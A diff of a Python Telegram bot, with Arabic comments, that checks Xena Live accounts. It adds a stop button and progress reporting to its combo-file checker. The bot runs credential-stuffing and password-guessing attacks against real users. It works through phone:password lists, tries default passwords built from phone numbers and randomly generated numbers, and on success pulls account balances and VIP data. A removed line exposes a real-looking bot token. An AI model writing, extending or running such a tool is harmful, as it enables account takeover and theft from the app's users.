@@ -1,6 +1,6 @@
-#!/usr/bin/env python3
+#!/usr/init/env python3
 # ╔══════════════════════════════════════════════════════════╗
-# ║    📱  Xena Live — Telegram Bot Checker v2.2            ║
+# ║    📱  Xena Live — Telegram Bot Checker v2.4            ║
 # ╚══════════════════════════════════════════════════════════╝
 
 import os
@@ -18,7 +18,7 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ضع توكن البوت الخاص بك هنا
-BOT_TOKEN = "8844579780:AAFDxl5UZRA64eHcoxboAUfp7hkE1XVD8jA"
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ══════════════════════════════════════════════════════════
@@ -208,7 +208,6 @@ def _parse_login(data):
         for fld_n in (3, 4):
             f = _fget(top, fld_n)
             if f and f[3]:
-                # محاولة فك الرسالة المتداخلة للتوكن لتجنب أخطاء الـ Metadata
                 try:
                     sub_fields = _proto(f[3])
                     for sf in sub_fields:
@@ -219,7 +218,6 @@ def _parse_login(data):
                 except:
                     pass
                 
-                # التحقق الاحتياطي لو كان التوكن نصاً مباشراً ونظيفاً
                 if not r["token"]:
                     s = f[3].decode(errors="replace").strip()
                     if len(s) >= 32 and "\n" not in s and "\x10" not in s:
@@ -277,7 +275,6 @@ def _fetch_info(cli, short_uid, token):
     data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=6.0)
     info["vipLevel"] = _find_vip(data2) if not err2 and data2 else ""
     
-    # Balance
     d_data, d_err = cli.call(cli._balance, None, extra_meta=extra, timeout=6.0)
     dia = coins = gold = 0
     if not d_err and d_data:
@@ -329,6 +326,7 @@ def detect_country_and_format(phone_input):
 # ══════════════════════════════════════════════════════════
 
 user_states = {}
+stop_events = {}  # متغيرات إيقاف الفحص النشط لكل مستخدم
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -339,17 +337,28 @@ def send_welcome(message):
         InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_check"),
         InlineKeyboardButton("⚡ فحص تلقائي عشوائي", callback_data="auto_check")
     )
-    bot.reply_to(message, " أهلاً بك في بوت فحص حسابات Xena Live.\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)
+    bot.reply_to(message, "أهلاً بك في بوت فحص حسابات Xena Live.\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     chat_id = call.message.chat.id
+    
+    # معالجة طلب إيقاف الفحص
+    if call.data.startswith("stop_combo_"):
+        target_chat_id = int(call.data.split("_")[2])
+        if target_chat_id in stop_events:
+            stop_events[target_chat_id].set()
+            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص...")
+        else:
+            bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط حالياً.")
+        return
+
     if call.data == "single_check":
         user_states[chat_id] = "waiting_single"
         bot.send_message(chat_id, "أرسل الحساب بالصيغة التالية:\n`الرقم:كلمة المرور`\nأو أرسل الرقم فقط وسيتم فحصه بالباسوردات الافتراضية.", parse_mode="Markdown")
     elif call.data == "combo_check":
         user_states[chat_id] = "waiting_combo"
-        bot.send_message(chat_id, "📁 قم برفع ملف الكومبو بصيغة `.txt`\n(يجب أن تكون كل سطر بصيغة `رقم:باسورد` أو `رقم` فقط).")
+        bot.send_message(chat_id, "📁 قم برفع ملف الكومبو بصيغة `.txt`\n(يجب أن يكون كل سطر بصيغة `رقم:باسورد` أو `رقم` فقط).")
     elif call.data == "auto_check":
         markup = InlineKeyboardMarkup()
         for cc in COUNTRY_MAP.keys():
@@ -370,14 +379,11 @@ def process_single(message):
     custom_pw = parts[1].strip() if len(parts) > 1 else None
     
     phone, country = detect_country_and_format(raw_phone)
-    
     bot.send_message(message.chat.id, f"🔍 جاري فحص الرقم: `{phone}` (الدولة: {country})...", parse_mode="Markdown")
     
     cli = GrpcClient()
-    
     local_part = phone.split("-")[-1] if "-" in phone else phone
     default_first_pw = "0" + local_part
-    
     passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
     
     hit_found = False
@@ -407,52 +413,107 @@ def handle_docs(message):
         with open(file_path, "wb") as f:
             f.write(downloaded_file)
             
-        bot.send_message(chat_id, "📁 تم تلقي ملف الكومبو. بدأ عملية الفحص بالتوازي...")
-        threading.Thread(target=run_combo_checker, args=(chat_id, file_path), daemon=True).start()
+        # إنشاء حدث إيقاف جديد لهذا المستخدم
+        stop_event = threading.Event()
+        stop_events[chat_id] = stop_event
+        
+        bot.send_message(chat_id, "📁 تم تلقي ملف الكومبو. جارِ التحضير وبدء الفحص...")
+        threading.Thread(target=run_combo_checker, args=(chat_id, file_path, stop_event), daemon=True).start()
 
-def run_combo_checker(chat_id, file_path):
+def run_combo_checker(chat_id, file_path, stop_event):
     cli = GrpcClient()
     hits_count = 0
     total = 0
     
     try:
         with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-            lines = f.readlines()
+            lines = [l.strip() for l in f.readlines() if l.strip()]
             total = len(lines)
             
-            for line in lines:
-                line = line.strip()
-                if not line: continue
-                
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    raw_phone, custom_pw = parts[0].strip(), parts[1].strip()
-                else:
-                    raw_phone, custom_pw = line.strip(), None
-                
-                phone, country = detect_country_and_format(raw_phone)
-                local_part = phone.split("-")[-1] if "-" in phone else phone
-                default_first_pw = "0" + local_part
-                
-                passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
-                
-                hit_found = False
-                for idx, pw in enumerate(passwords_to_try):
-                    if not pw: continue
-                    r = _do_login(cli, phone, pw, country)
-                    if r.get("status") == "hit":
-                        hits_count += 1
-                        acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
-                        msg = format_hit_msg(phone, pw, r, acct, via="COMBO")
-                        bot.send_message(chat_id, msg, parse_mode="Markdown")
-                        hit_found = True
-                        break
+        if total == 0:
+            bot.send_message(chat_id, "⚠️ ملف الكومبو فارغ.")
+            cli.close()
+            return
+
+        # إنشاء زر إيقاف الفحص
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_combo_{chat_id}"))
+
+        status_msg = bot.send_message(
+            chat_id, 
+            f"🔄 **بدء فحص الكومبو التلقائي...**\n"
+            f"📊 المجموع الكلي: `{total}`\n"
+            f"⏳ تم فحص: `0 / {total}`\n"
+            f"🎯 عدد الـ Hits: `0`", 
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
         
-        bot.send_message(chat_id, f"🏁 **انتهى فحص الكومبو!**\nإجمالي السطور: {total}\nتم العثور على: {hits_count} Hit", parse_mode="Markdown")
+        last_update = 0
+        for idx, line in enumerate(lines, 1):
+            # التحقق مما إذا قام المستخدم بالضغط على زر الإيقاف
+            if stop_event.is_set():
+                bot.send_message(chat_id, f"🛑 **تم إيقاف الفحص بنجاح بناءً على طلبك!**\n📊 تم فحص: `{idx-1} / {total}`\n🎯 الـ Hits المكتشفة حتى الإيقاف: `{hits_count}`", parse_mode="Markdown")
+                break
+
+            if ":" in line:
+                parts = line.split(":", 1)
+                raw_phone, custom_pw = parts[0].strip(), parts[1].strip()
+            else:
+                raw_phone, custom_pw = line.strip(), None
+            
+            phone, country = detect_country_and_format(raw_phone)
+            local_part = phone.split("-")[-1] if "-" in phone else phone
+            default_first_pw = "0" + local_part
+            
+            passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
+            
+            hit_found = False
+            for idx_pw, pw in enumerate(passwords_to_try):
+                if not pw: continue
+                r = _do_login(cli, phone, pw, country)
+                if r.get("status") == "hit":
+                    hits_count += 1
+                    acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
+                    msg = format_hit_msg(phone, pw, r, acct, via="COMBO")
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                    hit_found = True
+                    break
+            
+            # تحديث العد التلقائي في الرسالة
+            if idx - last_update >= 5 or idx == total:
+                try:
+                    bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=status_msg.message_id,
+                        text=f"🔄 **جارِ فحص الكومبو تلقائياً...**\n"
+                             f"📊 المجموع الكلي: `{total}`\n"
+                             f"⏳ تم فحص: `{idx} / {total}`\n"
+                             f"🎯 عدد الـ Hits: `{hits_count}`",
+                        parse_mode="Markdown",
+                        reply_markup=markup
+                    )
+                    last_update = idx
+                except:
+                    pass
+                time.sleep(0.2)
+        
+        if not stop_event.is_set():
+            # إزالة الزر أو تعديل رسالة النهاية عند اكتمال الملف تماماً
+            try:
+                bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=status_msg.message_id,
+                    text=f"🏁 **انتهى فحص الكومبو بالكامل!**\n📊 إجمالي السطور المفحوصة: `{total}`\n🎯 الـ Hits الناجحة الإجمالية: `{hits_count}`",
+                    parse_mode="Markdown"
+                )
+            except:
+                pass
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ حدث خطأ أثناء فحص الملف: {e}")
     finally:
         cli.close()
+        stop_events.pop(chat_id, None)
         if os.path.exists(file_path):
             os.remove(file_path)
 
@@ -460,7 +521,7 @@ def run_auto_checker(chat_id, cc):
     cli = GrpcClient()
     c_info = COUNTRY_MAP.get(cc, COUNTRY_MAP["SA"])
     
-    bot.send_message(chat_id, f"🚀 تم تشغيل الفحص التلقائي لـ {cc}. سيتم إرسال الـ Hits عند العثور عليها.")
+    bot.send_message(chat_id, f"🚀 تم تشغيل الفحص التلقائي العشوائي لـ {cc}. سيتم إرسال الـ Hits عند العثور عليها.")
     
     for _ in range(50):
         pref = random.choice(c_info["prefs"])
